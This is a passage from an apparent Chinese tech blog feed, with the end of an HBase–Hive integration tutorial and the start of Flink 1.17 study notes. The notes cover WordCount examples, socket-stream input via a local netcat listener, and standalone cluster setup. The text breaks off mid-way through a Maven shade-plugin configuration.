class="comment"># 查看 Hive 以及关联的 HBase 表中是否已经成功的同步插入了数据</span></span><br><span class="line">hive&gt; select * from hive_hbase_emp_table;</span><br><span class="line">Hbase&gt; scan <span class="string">'hbase_emp_table'</span></span><br></pre></td></tr></table></figure><h3 id="2-2-案例二">2.2 案例二</h3><p>目标：在 HBase 中已经存储了某一张表 hbase_emp_table，然后在 Hive 中创建一个外部表来关联 HBase 中的 hbase_emp_table 这张表，使之可以借助 Hive 来分析 HBase 这张表中的数据。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 Hive 中创建外部表</span></span><br><span class="line">CREATE EXTERNAL TABLE relevance_hbase_emp(</span><br><span class="line"> empno int,</span><br><span class="line"> ename string,</span><br><span class="line"> job string,</span><br><span class="line"> mgr int,</span><br><span class="line"> hiredate string,</span><br><span class="line"> sal double,</span><br><span class="line"> deptno int</span><br><span class="line">)</span><br><span class="line">STORED BY <span class="string">'org.apache.hadoop.hive.hbase.HBaseStorageHandler'</span></span><br><span class="line">WITH SERDEPROPERTIES (<span class="string">"hbase.columns.mapping"</span> = <span class="string">":key,info:ename,info:job,info:mgr,info:hiredate,info:sal,info:comm,info:deptno"</span>) </span><br><span class="line">TBLPROPERTIES (<span class="string">"hbase.table.name"</span> = <span class="string">"hbase_emp_table"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关联后就可以使用 Hive 函数进行一些分析操作了</span></span><br><span class="line">hive (default)&gt; select deptno,avg(sal) monery from relevance_hbase_emp group by deptno;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1&gt;一、HBase 简介&lt;/h1&gt;
&lt;h2 id=&quot;1、HBase-定义&quot;&gt;1、HBase 定义&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;官网：&lt;a href=&quot;https://hbase.apache.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; title=&quot;https://hbase.apache.org/&quot;&gt;https://hbase.apache.org/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;1-1-概述&quot;&gt;1.1 概述&lt;/h3&gt;
&lt;p&gt;HBase 是 BigTable 的开源 Java 版本。&lt;strong&gt;是建立在 HDFS 之上&lt;/strong&gt;，提供高可靠性、高性能、列存储、可伸缩、实时读写 NoSql 的数据库系统。它介于 NoSql 和 RDBMS 之间，仅能通过主键(row key)和主键的 range 来检索数据，仅支持单行事务(可通过 hive 支持来实现多表 join 等复杂操作)。&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>Flink1.17学习笔记</title>
    <link href="https://blog.shawncoding.top/posts/3348d9c3.html"/>
    <id>https://blog.shawncoding.top/posts/3348d9c3.html</id>
    <published>2024-05-31T08:22:00.000Z</published>
    <updated>2024-05-31T08:30:28.920Z</updated>
    
    <content type="html"><![CDATA[<h1>一、Flink概述与入门</h1><h2 id="1、Flink概述">1、Flink概述</h2><h3 id="1-1-Flink是什么">1.1 Flink是什么</h3><blockquote><p>官网：https:flink.apache.org</p></blockquote><p>Flink核心目标，是“<strong>数据流上的有状态计算</strong>”(Stateful Computati ons over Data Streams)具体说明：Apache Flink是一个框架和分布式处理引擎，用于对<strong>无界</strong>和<strong>有界</strong>数据流进行<strong>有状态</strong>计算。</p><a id="more"></a><p><strong>无界数据流</strong></p><ul><li>有定义流的开始，但没有定义流的结束</li><li>它们会无休止的产生数据</li><li>无界流的数据必须持续处理，即数据被摄取后需要立刻处理。我们不能等到所有数据都到达再处理，因为输入是无限的。</li></ul><p><strong>有界数据流</strong></p><ul><li>有定义流的开始，也有定义流的结束</li><li>有界流可以在摄取所有数据后再进行计算</li><li>有界流所有数据可以被排序，所以并不需要有序摄取</li><li>有界流处理通常被称为批处理</li></ul><p><strong>有状态流处理</strong></p><p>把流处理需要的额外数据保存成一个“状态”，然后针对这条数据进行处理，并且更新状态。这就是所谓的“有状态的流处理”</p><ul><li>状态在内存中:优点，速度快；缺点，可靠性差</li><li>状态在分布式系统中:优点，可靠性高;缺点，速度慢</li></ul><h3 id="1-2-Flink特点">1.2 Flink特点</h3><p>我们处理数据的目标是:低延迟、高吞吐、结果的准确性和良好的容错性。Flink主要特点如下:</p><ul><li><strong>高吞吐和低延迟</strong>。每秒处理数百万个事件，毫秒级延迟</li><li><strong>结果的准确性</strong>。Flink提供了事件时间( event-time）和处理时间( processing-time）语义。对于乱序事件流，事件时间语义仍然能提供一致且准确的结果</li><li><strong>精确一次</strong>( exactly-once）的状态一致性保证</li><li><strong>可以连接到最常用的外部系统</strong>，如Kafka、Hive、JDBC、HDFS、Redis等</li><li><strong>高可用</strong>。本身高可用的设置，加上与K8s，YARN和Mesos的紧密集成，再加上从故障中快速恢复和动态扩展任务的能力，Flink能做到以极少的停机时间7×24全天候运行</li></ul><h3 id="1-3-Flink-vs-SparkStreaming">1.3 Flink vs SparkStreaming</h3><p><img src="http://qnypic.shawncoding.top/blog/202404161646737.png" alt></p><table><thead><tr><th></th><th><strong>F****link</strong></th><th><strong>Streaming</strong></th></tr></thead><tbody><tr><td><strong>计算模型</strong></td><td>流计算</td><td>微批处理</td></tr><tr><td><strong>时间语义</strong></td><td>事件时间、处理时间</td><td>处理时间</td></tr><tr><td><strong>窗口</strong></td><td>多、灵活</td><td>少、不灵活（窗口必须是批次的整数倍）</td></tr><tr><td><strong>状态</strong></td><td>有</td><td>没有</td></tr><tr><td>流式<strong>SQL</strong></td><td>有</td><td>没有</td></tr></tbody></table><h3 id="1-4-Flink的应用场景">1.4 Flink的应用场景</h3><ul><li>电商和市场营销。举例:实时数据报表、广告投放、实时推荐</li><li>物联网(IoT)。举例:传感器实时数据采集和显示、实时报警，交通运输业</li><li>物流配送和服务业。举例:订单状态实时更新、通知信息推送</li><li>银行和金融业。举例:实时结算和通知推送，实时检测异常行为</li></ul><h3 id="1-5-Flink分层API">1.5 Flink分层API</h3><p><img src="http://qnypic.shawncoding.top/blog/202404161646738.png" alt></p><h2 id="2、Flink快速上手">2、Flink快速上手</h2><h3 id="2-1-环境准备">2.1 环境准备</h3><p>创建maven工程，引入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">flink.version</span>&gt;</span>1.17.0<span class="tag">&lt;/<span class="name">flink.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-streaming-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-clients<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-2-WordCount之批处理">2.2 WordCount之批处理</h3><p>批处理基本思路：先逐行读入文件数据，然后将每一行文字拆分成单词；接着按照单词分组，统计每组数据的个数，就是对应单词的频次。首先在工程根目录下新建一个input文件夹，并在下面创建文本文件words.txt，然后进行代码编写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BatchWordCount</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 1. 创建执行环境</span></span><br><span class="line">        ExecutionEnvironment env = ExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        <span class="comment">// 2. 从文件读取数据  按行读取(存储的元素就是每行的文本)</span></span><br><span class="line">        DataSource&lt;String&gt; lineDS = env.readTextFile(<span class="string">"input/words.txt"</span>);</span><br><span class="line">        <span class="comment">// 3. 转换数据格式</span></span><br><span class="line">        FlatMapOperator&lt;String, Tuple2&lt;String, Long&gt;&gt; wordAndOne = lineDS.flatMap(<span class="keyword">new</span> FlatMapFunction&lt;String, Tuple2&lt;String, Long&gt;&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">flatMap</span><span class="params">(String line, Collector&lt;Tuple2&lt;String, Long&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                String[] words = line.split(<span class="string">" "</span>);</span><br><span class="line">                <span class="keyword">for</span> (String word : words) &#123;</span><br><span class="line">                    out.collect(Tuple2.of(word,<span class="number">1L</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 4. 按照 word 进行分组</span></span><br><span class="line">        UnsortedGrouping&lt;Tuple2&lt;String, Long&gt;&gt; wordAndOneUG = wordAndOne.groupBy(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 5. 分组内聚合统计</span></span><br><span class="line">        AggregateOperator&lt;Tuple2&lt;String, Long&gt;&gt; sum = wordAndOneUG.sum(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 6. 打印结果</span></span><br><span class="line">        sum.print();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="comment">// (flink,1)</span></span><br><span class="line"><span class="comment">// (world,1)</span></span><br><span class="line"><span class="comment">// (hello,3)</span></span><br><span class="line"><span class="comment">// (java,1)</span></span><br></pre></td></tr></table></figure><p>需要注意的是，这种代码的实现方式，是基于<strong>DataSet API</strong>的，也就是我们对数据的处理转换，是看作数据集来进行操作的。事实上Flink本身是流批统一的处理架构，批量的数据集本质上也是流，没有必要用两套不同的API来实现。<strong>所以从Flink 1.12开始，官方推荐的做法是直接使用DataStream API，在提交任务时通过将执行模式设为BATCH来进行批处理</strong>：<code>bin/flink run -Dexecution.runtime-mode=BATCH BatchWordCount.jar</code></p><h3 id="2-3-流处理之读取文件">2.3 流处理之读取文件</h3><p>对于Flink而言，流才是整个处理逻辑的底层核心，所以流批统一之后的DataStream API更加强大，可以直接处理批处理和流处理的所有场景</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StreamWordCount</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 1. 创建流式执行环境</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        <span class="comment">// 2. 读取文件</span></span><br><span class="line">        DataStreamSource&lt;String&gt; lineStream = env.readTextFile(<span class="string">"input/words.txt"</span>);</span><br><span class="line">        <span class="comment">// 3. 转换、分组、求和，得到统计结果</span></span><br><span class="line">        SingleOutputStreamOperator&lt;Tuple2&lt;String, Long&gt;&gt; sum = lineStream.flatMap(<span class="keyword">new</span> FlatMapFunction&lt;String, Tuple2&lt;String, Long&gt;&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">flatMap</span><span class="params">(String line, Collector&lt;Tuple2&lt;String, Long&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                String[] words = line.split(<span class="string">" "</span>);</span><br><span class="line">                <span class="keyword">for</span> (String word : words) &#123;</span><br><span class="line">                    out.collect(Tuple2.of(word, <span class="number">1L</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).keyBy(data -&gt; data.f0)</span><br><span class="line">           .sum(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 4. 打印</span></span><br><span class="line">        sum.print();</span><br><span class="line">        <span class="comment">// 5. 执行</span></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3&gt; (java,1)</span></span><br><span class="line"><span class="comment">// 5&gt; (hello,1)</span></span><br><span class="line"><span class="comment">// 5&gt; (hello,2)</span></span><br><span class="line"><span class="comment">// 5&gt; (hello,3)</span></span><br><span class="line"><span class="comment">// 13&gt; (flink,1)</span></span><br><span class="line"><span class="comment">// 9&gt; (world,1)</span></span><br></pre></td></tr></table></figure><p>主要观察与批处理程序BatchWordCount的不同：</p><ul><li>创建执行环境的不同，流处理程序使用的是StreamExecutionEnvironment</li><li>转换处理之后，得到的数据对象类型不同</li><li>分组操作调用的是keyBy方法，可以传入一个匿名函数作为键选择器（KeySelector），指定当前分组的key是什么</li><li>代码末尾需要调用env的execute方法，开始执行任务</li></ul><h3 id="2-4-流处理之读取socket文本流">2.4 流处理之读取socket文本流</h3><p>在实际的生产环境中，真正的数据流其实是无界的，有开始却没有结束，这就要求我们需要持续地处理捕获的数据。为了模拟这种场景，可以监听socket端口，然后向该端口不断的发送数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SocketStreamWordCount</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 1. 创建流式执行环境</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        <span class="comment">// 2. 读取文本流：hadoop102表示发送端主机名、7777表示端口号</span></span><br><span class="line">        DataStreamSource&lt;String&gt; lineStream = env.socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>);</span><br><span class="line">        <span class="comment">// 3. 转换、分组、求和，得到统计结果</span></span><br><span class="line">        SingleOutputStreamOperator&lt;Tuple2&lt;String, Long&gt;&gt; sum = lineStream.flatMap((String line, Collector&lt;Tuple2&lt;String, Long&gt;&gt; out) -&gt; &#123;</span><br><span class="line">            String[] words = line.split(<span class="string">" "</span>);</span><br><span class="line">            <span class="keyword">for</span> (String word : words) &#123;</span><br><span class="line">                out.collect(Tuple2.of(word, <span class="number">1L</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).returns(Types.TUPLE(Types.STRING, Types.LONG))</span><br><span class="line">                .keyBy(data -&gt; data.f0)</span><br><span class="line">                .sum(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 4. 打印</span></span><br><span class="line">        sum.print();</span><br><span class="line">        <span class="comment">// 5. 执行</span></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Linux环境的主机hadoop102上，执行下列命令，发送数据进行测试：<code>nc -lk 7777</code>，注意：要先启动端口，后启动StreamWordCount程序，否则会报超时连接异常。</p><p>启动StreamWordCount程序，我们会发现程序启动之后没有任何输出、也不会退出。这是正常的，因为Flink的流处理是事件驱动的，当前程序会一直处于监听状态，只有接收到数据才会执行任务、输出统计结果。</p><p>注意：Flink还具有一个类型提取系统，可以分析函数的输入和返回类型，自动获取类型信息，从而获得对应的序列化器和反序列化器。但是，由于Java中<strong>泛型擦除</strong>的存在，在某些特殊情况下（比如Lambda表达式中），自动提取的信息是不够精细的——只告诉Flink当前的元素由“船头、船身、船尾”构成，根本无法重建出“大船”的模样；这时就需要显式地提供类型信息，才能使应用程序正常工作或提高其性能。因为对于flatMap里传入的Lambda表达式，系统只能推断出返回的是Tuple2类型，而无法得到Tuple2&lt;String, Long&gt;。只有显式地告诉系统当前的返回类型，才能正确地解析出完整数据。</p><h1>二、Flink安装与部署</h1><h2 id="1、集群角色">1、集群角色</h2><p><img src="http://qnypic.shawncoding.top/blog/202404161646739.png" alt></p><h2 id="2、Flink集群搭建">2、Flink集群搭建</h2><h3 id="2-1-集群启动">2.1 集群启动</h3><table><thead><tr><th><strong>节点服务器</strong></th><th><strong>hadoop****102</strong></th><th><strong>hadoop****103</strong></th><th><strong>hadoop****104</strong></th></tr></thead><tbody><tr><td><strong>角色</strong></td><td>JobManagerTaskManager</td><td>TaskManager</td><td>TaskManager</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载安装包</span></span><br><span class="line">wget https://dlcdn.apache.org/flink/flink-1.17.1/flink-1.17.1-bin-scala_2.12.tgz</span><br><span class="line">tar -zxvf flink-1.17.1-bin-scala_2.12.tgz -C /opt/module/</span><br><span class="line">mv /opt/module/flink-1.17.1/ /opt/module/flink</span><br><span class="line"><span class="built_in">cd</span> /opt/module/flink</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改集群配置</span></span><br><span class="line"><span class="comment"># 进入conf路径，修改flink-conf.yaml文件，指定hadoop102节点服务器为JobManager </span></span><br><span class="line">vim conf/flink-conf.yaml</span><br><span class="line"><span class="comment"># 修改如下</span></span><br><span class="line"><span class="comment"># =====================================</span></span><br><span class="line"><span class="comment"># JobManager节点地址.</span></span><br><span class="line">jobmanager.rpc.address: hadoop102</span><br><span class="line">jobmanager.bind-host: 0.0.0.0</span><br><span class="line">rest.address: hadoop102</span><br><span class="line">rest.bind-address: 0.0.0.0</span><br><span class="line"><span class="comment"># TaskManager节点地址.需要配置为当前机器名</span></span><br><span class="line">taskmanager.bind-host: 0.0.0.0</span><br><span class="line">taskmanager.host: hadoop102</span><br><span class="line"><span class="comment"># =====================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改workers文件，指定hadoop102、hadoop103和hadoop104为TaskManager</span></span><br><span class="line">vim conf/workers</span><br><span class="line"><span class="comment"># 修改如下</span></span><br><span class="line"><span class="comment"># =====================================</span></span><br><span class="line">hadoop102</span><br><span class="line">hadoop103</span><br><span class="line">hadoop104</span><br><span class="line"><span class="comment"># =====================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改masters文件</span></span><br><span class="line">vim masters</span><br><span class="line"><span class="comment"># 修改如下</span></span><br><span class="line">hadoop102:8081</span><br><span class="line"><span class="comment"># =====================================</span></span><br></pre></td></tr></table></figure><p>在<code>flink-conf.yaml</code>文件中还可以对集群中的<code>JobManager</code>和<code>TaskManager</code>组件进行优化配置，主要配置项如下：</p><ul><li><code>jobmanager.memory.process.size</code>：对JobManager进程可使用到的全部内存进行配置，包括JVM元空间和其他开销，<strong>默认为1600M</strong>，可以根据集群规模进行适当调整</li><li><code>taskmanager.memory.process.size</code>：对TaskManager进程可使用到的全部内存进行配置，包括JVM元空间和其他开销，<strong>默认为1728M</strong>，可以根据集群规模进行适当调整</li><li><code>taskmanager.numberOfTaskSlots</code>：对每个TaskManager能够分配的Slot数量进行配置，<strong>默认为1</strong>，可根据TaskManager所在的机器能够提供给Flink的CPU数量决定。所谓Slot就是TaskManager中具体运行一个任务所分配的计算资源</li><li><code>parallelism.default</code>：Flink任务执行的并行度，<strong>默认为1</strong>。优先级低于代码中进行的并行度配置和任务提交时使用参数指定的并行度数量。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分发安装目录</span></span><br><span class="line"><span class="comment"># 配置修改完毕后，将Flink安装目录发给另外两个节点服务器</span></span><br><span class="line">xsync flink/</span><br><span class="line"><span class="comment"># 修改hadoop103的 taskmanager.host</span></span><br><span class="line">vim flink-conf.yaml</span><br><span class="line"><span class="comment"># TaskManager节点地址.需要配置为当前机器名</span></span><br><span class="line">taskmanager.host: hadoop103</span><br><span class="line"><span class="comment"># 修改hadoop104的 taskmanager.host</span></span><br><span class="line"><span class="comment"># TaskManager节点地址.需要配置为当前机器名</span></span><br><span class="line">taskmanager.host: hadoop104</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动集群</span></span><br><span class="line"><span class="comment"># 在hadoop102节点服务器上执行start-cluster.sh启动Flink集群</span></span><br><span class="line">bin/start-cluster.sh</span><br><span class="line"><span class="comment"># 查看进程情况：</span></span><br><span class="line">jpsall </span><br><span class="line"><span class="comment"># StandaloneSessionClusterEntrypoint</span></span><br><span class="line"><span class="comment"># TaskManagerRunner</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后访问web UI</span></span><br><span class="line"><span class="comment"># 启动成功后，同样可以访问http://hadoop102:8081对flink集群和任务进行监控管理</span></span><br><span class="line"><span class="comment"># 这里可以明显看到，当前集群的TaskManager数量为3；由于默认每个TaskManager的Slot数量为1，所以总Slot数和可用Slot数都为3</span></span><br></pre></td></tr></table></figure><h3 id="2-2-向集群提交作业">2.2 向集群提交作业</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在hadoop102中执行以下命令启动netcat</span></span><br><span class="line">nc -lk 7777</span><br></pre></td></tr></table></figure><p>然后进行程序打包，在我们编写的Flink入门程序的pom.xml文件中添加打包插件的配置，然后进行打包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-shade-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>shade<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">artifactSet</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>com.google.code.findbugs:jsr305<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>org.slf4j:*<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span 